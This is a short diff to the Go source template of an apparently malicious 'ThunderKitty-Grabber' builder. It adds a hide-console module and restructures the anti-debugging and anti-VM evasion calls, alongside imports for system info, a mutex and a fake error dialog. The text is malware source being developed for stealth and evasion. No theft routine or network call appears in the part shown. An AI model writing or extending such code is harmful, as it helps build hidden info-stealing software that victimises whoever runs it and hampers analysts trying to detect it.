@@ -42,6 +42,7 @@ package main
 
 import (
 	"ThunderKitty-Grabber/utils/sysinfo"
+	"ThunderKitty-Grabber/utils/hideconsole"
 	"ThunderKitty-Grabber/utils/antidbgandvm"
 	"ThunderKitty-Grabber/utils/mutex"
 	"ThunderKitty-Grabber/utils/fakeerror"
@@ -68,13 +69,19 @@ const (
 
 func main() {
 	var wg sync.WaitGroup
-
- 	if {{.EnableAntiDebug}} {
+	
+ 	if {{.HideConsole}} {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			AntiDebugVMAnalysis.ThunderKitty()
+			HideConsole.Hide()
 		}()
+	} else {
+		fmt.Println("Hide console not enabled")
+	}
+
+ 	if {{.EnableAntiDebug}} {
+		AntiDebugVMAnalysis.ThunderKitty()
 	} else {
 		fmt.Println("Anti-debugging and VM analysis not enabled")
 	}
